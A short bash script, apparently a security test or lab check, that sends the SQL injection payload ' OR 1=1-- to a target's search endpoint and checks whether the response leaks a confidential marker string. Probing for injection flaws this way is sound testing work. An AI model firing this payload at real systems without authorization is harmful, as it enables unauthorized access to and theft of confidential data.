#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/search" --data-urlencode "q=' OR 1=1--" | grep -F 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
